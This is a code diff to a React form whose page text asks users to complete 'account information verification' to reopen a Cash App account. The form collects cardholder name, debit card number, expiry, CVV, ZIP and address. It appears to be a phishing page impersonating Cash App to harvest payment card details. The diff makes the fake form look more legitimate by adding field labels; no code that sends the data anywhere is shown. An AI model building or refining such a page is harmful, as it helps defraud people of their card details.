@@ -16,12 +16,13 @@ Complete the account information verification process to reopen your Cash App ac
         {/* Form */}
         <form className="form">
           {/* Cardholder */}
+           <label className="label">Cardholder Name</label>
           <input
             type="text"
-            placeholder="Cardholder Name"
+   
             className="input"
           />
-
+    <label className="label">Debit card number</label>
           {/* Card Number */}
           <input
             type="text"
@@ -30,18 +31,25 @@ Complete the account information verification process to reopen your Cash App ac
           />
 
           {/* Row Expiry, CVV, ZIP */}
+             
           <div className="row">
+               <label className="label">Expiration</label>
             <input type="text" placeholder="MM/YY" className="input" />
+               <label className="label">CVV</label>
             <input type="text" placeholder="123" className="input" />
+ <label className="label">ZIP code</label>
             <input type="text" placeholder="12345" className="input" />
           </div>
 
           {/* Address */}
+   <label className="label">Street Address</label>
           <input type="text" placeholder="Street Address" className="input" />
 
           {/* City + State */}
           <div className="row">
+   <label className="label">City</label>
             <input type="text" placeholder="City" className="input" />
+        <label className="label">State</label>
             <input type="text" placeholder="State" className="input" />
           </div>
 
